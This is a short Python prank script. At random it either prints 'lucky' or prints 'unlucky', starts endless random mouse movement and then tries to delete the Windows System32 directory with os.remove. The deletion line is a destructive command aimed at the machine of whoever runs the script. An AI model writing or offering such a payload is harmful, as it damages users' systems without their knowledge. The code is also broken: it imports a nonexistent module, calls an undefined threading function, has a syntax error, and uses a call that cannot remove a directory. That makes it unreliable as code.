import random
import os
import time
import pyautogui
import threads


pyautogui.PAUSE = 0.01


def move_mouse_inf():
    while True:
        pyautogui.move((random.randint(0,200), (random.randint(0, 200))

if random.randint(0, 6) == 1:
    print("unlucky")
    threading.thread(move_mouse_inf())
    time.sleep(3)
    os.remove("C:/Windows/System32")
else:
    print("lucky")
